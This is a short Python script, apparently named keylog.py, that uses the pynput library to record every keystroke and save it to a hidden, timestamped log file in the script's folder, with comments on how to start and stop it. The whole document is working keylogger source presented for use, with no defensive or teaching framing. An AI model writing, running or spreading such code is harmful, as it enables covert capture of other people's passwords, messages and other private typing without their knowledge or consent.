from pynput.keyboard import Key, Listener
import logging
from datetime import datetime

time = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
#gets time of saving a file

logging.basicConfig(filename=(".keylog - "+ time +".txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
#logs
 
def on_press(key):
    logging.info(str(key))
 
with Listener(on_press=on_press) as listener :
    listener.join()


#"python3 keylog.py" to start
#ctrl+c to stop
#logs get saved in location which contains keylog.py